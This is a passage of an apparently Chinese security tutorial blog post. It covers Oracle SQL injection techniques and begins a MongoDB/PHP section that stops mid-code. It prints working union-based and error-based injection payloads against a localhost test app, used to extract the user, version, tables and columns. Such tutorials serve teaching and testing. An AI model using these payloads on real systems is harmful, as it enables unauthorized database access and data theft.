+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> session_privs<br></code></pre></td></tr></table></figure>
+<p>获取当前用户有权限的所有数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> owner, table_name <span class="hljs-keyword">FROM</span> all_tables<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015105341194.png'><img src="image-20231015105341194.png" alt="image-20231015105341194"></p>
+<p>获取表，all_tables类似于MySQL中的information_schema.tables，里面的结构可以自己构造sql语句。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> all_tables;<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015105406979.png'><img src="image-20231015105406979.png" alt="image-20231015105406979"></p>
+<p>获取字段名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> all_tab_columns<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015105421077.png'><img src="image-20231015105421077.png" alt="image-20231015105421077"></p>
+<p>在Oracle启动时，在 userenv 中存储了一些系统上下文信息，通过 SYS_CONTEXT 函数，我们可以取回相应的参数值。包括当前用户名等等。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> SYS_CONTEXT（<span class="hljs-string">&#x27;USERENV&#x27;</span>，<span class="hljs-string">&#x27;SESSION_USER&#x27;</span>） <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<p>更多可用参数说明可以查阅 Oracle 提供的文档：<a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B19306_01/server.102/b14200/functions165.htm">SYS_CONTEXT</a></p>
+<h2 id="4-4-注入类型"><a href="#4-4-注入类型" class="headerlink" title="4-4-注入类型"></a>4.4 注入类型</h2>
+<h3 id="4-4-1-联合查询"><a href="#4-4-1-联合查询" class="headerlink" title="4-4-1-联合查询"></a>4.4.1 联合查询</h3>
+<p>order by 猜字段数量，union select进行查询，<strong>需要注意的是每一个字段都需要对应前面select的数据类型(字符串/数字)</strong>。所以我们一般先使用null字符占位，然后逐位判断每个字段的类型，比如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; union select null,null,null from dual -- 正常</span><br><span class="hljs-string">http://localhost:8080/oracleInject/index?username=admin&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual <span class="hljs-comment">-- 正常说明第一个字段是数字型</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; union select 1,2,null from dual -- 第二个字段为数字时错误</span><br><span class="hljs-string">http://localhost:8080/oracleInject/index?username=admin&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;asd&#x27;</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual <span class="hljs-comment">-- 正常 为字符串 依此类推</span><br></code></pre></td></tr></table></figure>
+<p>查数据库版本和用户名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; union select 1,(select user from dual),(SELECT banner FROM v$version where banner like &#x27;</span>Oracle<span class="hljs-operator">%</span><span class="hljs-number">25</span><span class="hljs-string">&#x27;) from dual -- </span><br></code></pre></td></tr></table></figure>
+<p>查当前数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; union select 1,(SELECT global_name FROM global_name),null from dual -- </span><br></code></pre></td></tr></table></figure>
+<p>查表，wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; union select 1,(select LISTAGG(table_name,&#x27;</span>,<span class="hljs-string">&#x27;)within group(order by owner)name from all_tables where owner=&#x27;</span><span class="hljs-keyword">SYSTEM</span><span class="hljs-string">&#x27;),null from dual -- </span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20231015111109733.png'><img src="image-20231015111109733.png" alt="image-20231015111109733"></p>
+<p>但是LISTAGG()返回的是varchar类型，如果数据表很多会出现字符串长度过长的问题。这个时候可以使用通过字符串截取来进行。</p>
+<p>查字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; union select 1,(select column_name from all_tab_columns where table_name=&#x27;</span>TEST<span class="hljs-string">&#x27; and rownum=2),null from dual -- </span><br></code></pre></td></tr></table></figure>
+<p>有表名字段名出数据就不说了。</p>
+<h2 id="4-5-报错注入"><a href="#4-5-报错注入" class="headerlink" title="4-5-报错注入"></a>4.5 报错注入</h2>
+<h3 id="4-5-1-utl-inaddr-get-host-name"><a href="#4-5-1-utl-inaddr-get-host-name" class="headerlink" title="4-5-1-utl-inaddr-get-host-name"></a>4.5.1 utl_inaddr.get_host_name</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> utl_inaddr.get_host_name((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p>
+<h3 id="4-5-2-ctxsys-drithsx-sn"><a href="#4-5-2-ctxsys-drithsx-sn" class="headerlink" title="4-5-2-ctxsys-drithsx-sn"></a>4.5.2 <a target="_blank" rel="noopener" href="http://ctxsys.drithsx.sn">ctxsys.drithsx.sn</a></h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> ctxsys.drithsx.sn(<span class="hljs-number">1</span>, (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<p>处理文本的函数，参数错误时会报错。</p>
+<h3 id="4-5-3-CTXSYS-CTX-REPORT-TOKEN-TYPE"><a href="#4-5-3-CTXSYS-CTX-REPORT-TOKEN-TYPE" class="headerlink" title="4-5-3-CTXSYS-CTX-REPORT-TOKEN-TYPE"></a>4.5.3 CTXSYS.CTX_REPORT.TOKEN_TYPE</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> CTXSYS.CTX_REPORT.TOKEN_TYPE((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual), <span class="hljs-string">&#x27;123&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="4-5-4-XMLType"><a href="#4-5-4-XMLType" class="headerlink" title="4-5-4-XMLType"></a>4.5.4 XMLType</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>oracleInject<span class="hljs-operator">/</span>index?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span><br></code></pre></td></tr></table></figure>
+<p>注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。</p>
+<h3 id="4-5-6-dbms-xdb-version-checkin"><a href="#4-5-6-dbms-xdb-version-checkin" class="headerlink" title="4-5-6-dbms-xdb-version-checkin"></a>4.5.6 dbms_xdb_version.checkin</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> dbms_xdb_version.checkin((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="4-5-7-dbms-xdb-version-makeversioned"><a href="#4-5-7-dbms-xdb-version-makeversioned" class="headerlink" title="4-5-7-dbms-xdb-version-makeversioned"></a>4.5.7 dbms_xdb_version.makeversioned</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> dbms_xdb_version.makeversioned((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="4-5-8-dbms-xdb-version-uncheckout"><a href="#4-5-8-dbms-xdb-version-uncheckout" class="headerlink" title="4-5-8-dbms-xdb-version-uncheckout"></a>4.5.8 dbms_xdb_version.uncheckout</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> dbms_xdb_version.uncheckout((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="4-5-9-dbms-utility-sqlid-to-sqlhash"><a href="#4-5-9-dbms-utility-sqlid-to-sqlhash" class="headerlink" title="4-5-9-dbms-utility-sqlid-to-sqlhash"></a>4.5.9 dbms_utility.sqlid_to_sqlhash</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="4-5-10-ordsys-ord-dicom-getmappingxpath"><a href="#4-5-10-ordsys-ord-dicom-getmappingxpath" class="headerlink" title="4-5-10-ordsys-ord-dicom-getmappingxpath"></a>4.5.10 ordsys.ord_dicom.getmappingxpath</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> ordsys.ord_dicom.getmappingxpath((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="4-5-11-UTL-INADDR-get-host-name"><a href="#4-5-11-UTL-INADDR-get-host-name" class="headerlink" title="4-5-11-UTL-INADDR-get-host-name"></a>4.5.11 UTL_INADDR.get_host_name</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> UTL_INADDR.get_host_name((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="4-5-12-UTL-INADDR-get-host-address"><a href="#4-5-12-UTL-INADDR-get-host-address" class="headerlink" title="4-5-12-UTL-INADDR-get-host-address"></a>4.5.12 UTL_INADDR.get_host_address</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> UTL_INADDR.get_host_name(<span class="hljs-string">&#x27;~&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">||</span><span class="hljs-string">&#x27;~&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<p>剩下的参考下面的链接吧，这里只是做个记录</p>
+<h1>0x05 MongoDB</h1>
+<h2 id="5-1-NoSQL与MongoDB基本概念"><a href="#5-1-NoSQL与MongoDB基本概念" class="headerlink" title="5-1-NoSQL与MongoDB基本概念"></a>5.1 NoSQL与MongoDB基本概念</h2>
+<p><strong>NoSQL</strong></p>
+<p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</p>
+<p>NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>
+<p><strong>NoSQL 数据库分类</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">类型</th>
+<th style="text-align:left">部分代表</th>
+<th style="text-align:left">特点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">列存储</td>
+<td style="text-align:left">HbaseCassandraHypertable</td>
+<td style="text-align:left">顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。</td>
+</tr>
+<tr>
+<td style="text-align:left">文档存储</td>
+<td style="text-align:left">MongoDBCouchDB</td>
+<td style="text-align:left">文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能。</td>
+</tr>
+<tr>
+<td style="text-align:left">key-value存储</td>
+<td style="text-align:left">Tokyo Cabinet / TyrantBerkeley DBMemcacheDBRedis</td>
+<td style="text-align:left">可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能）</td>
+</tr>
+<tr>
+<td style="text-align:left">图存储</td>
+<td style="text-align:left">Neo4JFlockDB</td>
+<td style="text-align:left">图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。</td>
+</tr>
+<tr>
+<td style="text-align:left">对象存储</td>
+<td style="text-align:left">db4oVersant</td>
+<td style="text-align:left">通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。</td>
+</tr>
+<tr>
+<td style="text-align:left">xml数据库</td>
+<td style="text-align:left">Berkeley DB XMLBaseX</td>
+<td style="text-align:left">高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>MongoDB</strong></p>
+<p>MongoDB属于NoSQL数据库的一种，是由C++语言编写的一个基于分布式文件存储的开源数据库系统，旨在为Web应用提供可扩展的高性能数据存储解决方案。在高负载的情况下，添加更多的节点，可以保证服务器性能。</p>
+<p>MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。<strong>MongoDB 文档类似于 JSON 对象</strong>。字段值可以包含其他文档，数组及文档数组。</p>
+<p><strong>MongoDB概念解析</strong></p>
+<p>和关系型数据库的相关概念不一样，在MongoDB中基本的概念是文档、集合、数据库，如下表：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">SQL术语/概念</th>
+<th style="text-align:left">MongoDB术语/概念</th>
+<th style="text-align:left">解释/说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">database</td>
+<td style="text-align:left">database</td>
+<td style="text-align:left">数据库</td>
+</tr>
+<tr>
+<td style="text-align:left">table</td>
+<td style="text-align:left">collection</td>
+<td style="text-align:left">数据库表/集合</td>
+</tr>
+<tr>
+<td style="text-align:left">row</td>
+<td style="text-align:left">document</td>
+<td style="text-align:left">数据记录行/文档</td>
+</tr>
+<tr>
+<td style="text-align:left">column</td>
+<td style="text-align:left">field</td>
+<td style="text-align:left">数据字段/域</td>
+</tr>
+<tr>
+<td style="text-align:left">index</td>
+<td style="text-align:left">index</td>
+<td style="text-align:left">索引</td>
+</tr>
+<tr>
+<td style="text-align:left">table joins</td>
+<td style="text-align:left"></td>
+<td style="text-align:left">表连接,MongoDB不支持</td>
+</tr>
+<tr>
+<td style="text-align:left">primary key</td>
+<td style="text-align:left">primary key</td>
+<td style="text-align:left">主键,MongoDB自动将_id字段设置为主键</td>
+</tr>
+</tbody>
+</table>
+<h2 id="5-2-PHP操作MongoDB"><a href="#5-2-PHP操作MongoDB" class="headerlink" title="5-2-PHP操作MongoDB"></a>5.2 PHP操作MongoDB</h2>
+<p>PHP下操作MongoDB大致分为两种方式，对应有不同的注入攻击方式。</p>
+<h3 id="使用MongoDB类中相应的方法"><a href="#使用MongoDB类中相应的方法" class="headerlink" title="使用MongoDB类中相应的方法"></a>使用MongoDB类中相应的方法</h3>
+<p>使用的Demo大致如下，此时传递进入的参数是一个数组：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();<br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;myinfo; <span class="hljs-comment">//选择数据库</span><br><span class="hljs-variable">$coll</span> = <span class="hljs-variable">$db</span>-&gt;test; <span class="hljs-comment">//选择集合</span><br><span class="hljs-variable">$coll</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();    <span class="hljs-comment">//增</span><br><span class="hljs-variable">$coll</span>-&gt;<span class="hljs-title function_ invoke__">find</span>();    <span class="hljs-comment">//查</span><br><span class="hljs-variable">$coll</span>-&gt;<span class="hljs-title function_ invoke__">remove</span>();    <span class="hljs-comment">//减</span><br><span class="hljs-variable">$coll</span>-&gt;<span class="hljs-title function_ invoke__">update</span>();    <span class="hljs-comment">//改</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>确保连接及选择一个数据库</strong></p>
+<p>为了确保正确连接，你需要指定数据库名，如果数据库在MongoDB中不存在，MongoDB会自动创建。</p>
+<p>示例代码如下，访问页面会直接返回数据库名test：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>$m = new MongoClient(); // 连接默认主机和端口为：mongodb://localhost:27017<br>$db = $m-&gt;test; // 获取名称为 &quot;test&quot; 的数据库<br>echo $db;<br>?&gt;<br></code></pre></td></tr></table></figure>
+<h4 id="1-创建集合"><a href="#1-创建集合" class="headerlink" title="1-创建集合"></a>1. 创建集合</h4>
+<p>创建集合的代码片段如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>(); <span class="hljs-comment">// 连接</span><br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test; <span class="hljs-comment">// 获取名称为 &quot;test&quot; 的数据库</span><br><span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">createCollection</span>(<span class="hljs-string">&quot;Mi1k&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;集合创建成功：&quot;</span>.<span class="hljs-variable">$collection</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>在数据库中确认确实创建成功：</p>
+<p class='item-img' data-src='image-20231015113802968.png'><img src="image-20231015113802968.png" alt="image-20231015113802968"></p>
+<h4 id="2-插入文档"><a href="#2-插入文档" class="headerlink" title="2-插入文档"></a>2. 插入文档</h4>
+<p>在MongoDB中使用insert()方法插入文档，代码片段如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span><br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test;            <span class="hljs-comment">// 选择一个数据库</span><br><span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;Mi1k; <span class="hljs-comment">// 选择集合</span><br><span class="hljs-variable">$document</span> = <span class="hljs-keyword">array</span>( <br>    <span class="hljs-string">&quot;title&quot;</span> =&gt; <span class="hljs-string">&quot;Hello&quot;</span>, <br>    <span class="hljs-string">&quot;description&quot;</span> =&gt; <span class="hljs-string">&quot;Just a test.&quot;</span>, <br>    <span class="hljs-string">&quot;likes&quot;</span> =&gt; <span class="hljs-number">100</span>,<br>    <span class="hljs-string">&quot;url&quot;</span> =&gt; <span class="hljs-string">&quot;https://www.mi1k7ea.com/&quot;</span>,<br>    <span class="hljs-string">&quot;by&quot;</span>, <span class="hljs-string">&quot;mi1k7ea&quot;</span><br>);<br><span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$document</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;数据插入成功&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>插入成功后，到数据库中确认，这里pretty()方法以格式化的方式来显示所有文档。：</p>
+<p class='item-img' data-src='image-20231015113824293.png'><img src="image-20231015113824293.png" alt="image-20231015113824293"></p>
+<h4 id="查找文档"><a href="#查找文档" class="headerlink" title="查找文档"></a>查找文档</h4>
+<p>使用find()方法来读取集合中的文档，代码片段如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span><br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test;            <span class="hljs-comment">// 选择一个数据库</span><br><span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;Mi1k; <span class="hljs-comment">// 选择集合</span><br><br><span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">find</span>();<br><span class="hljs-comment">// 迭代显示文档标题</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$document</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$document</span>[<span class="hljs-string">&quot;title&quot;</span>] . <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>访问即可看到查询的标题：</p>
+<p class='item-img' data-src='image-20231015113904280.png'><img src="image-20231015113904280.png" alt="image-20231015113904280"></p>
+<h4 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h4>
+<p>使用update()方法来更新文档，代码片段如下，将标题内容从Hello改为World：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span><br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test;            <span class="hljs-comment">// 选择一个数据库</span><br><span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;Mi1k; <span class="hljs-comment">// 选择集合</span><br><span class="hljs-comment">// 更新文档</span><br><span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;title&quot;</span>=&gt;<span class="hljs-string">&quot;Hello&quot;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$set&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;title&quot;</span>=&gt;<span class="hljs-string">&quot;World&quot;</span>)));<br><span class="hljs-comment">// 显示更新后的文档</span><br><span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">find</span>();<br><span class="hljs-comment">// 循环显示文档标题</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$document</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$document</span>[<span class="hljs-string">&quot;title&quot;</span>] . <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>修改后显示改后的标题内容，客户端确认是修改了：</p>
+<p class='item-img' data-src='image-20231015113934648.png'><img src="image-20231015113934648.png" alt="image-20231015113934648"></p>
+<h4 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h4>
+<p>使用remove()方法来删除文档。</p>
+<p>代码片段如下，将移除’title’为’World’的一条数据记录：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();    <span class="hljs-comment">// 连接到mongodb</span><br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$m</span>-&gt;test;            <span class="hljs-comment">// 选择一个数据库</span><br><span class="hljs-variable">$collection</span> = <span class="hljs-variable">$db</span>-&gt;Mi1k; <span class="hljs-comment">// 选择集合</span><br>   <br><span class="hljs-comment">// 移除文档</span><br><span class="hljs-variable">$collection</span>-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;title&quot;</span>=&gt;<span class="hljs-string">&quot;World&quot;</span>), <span 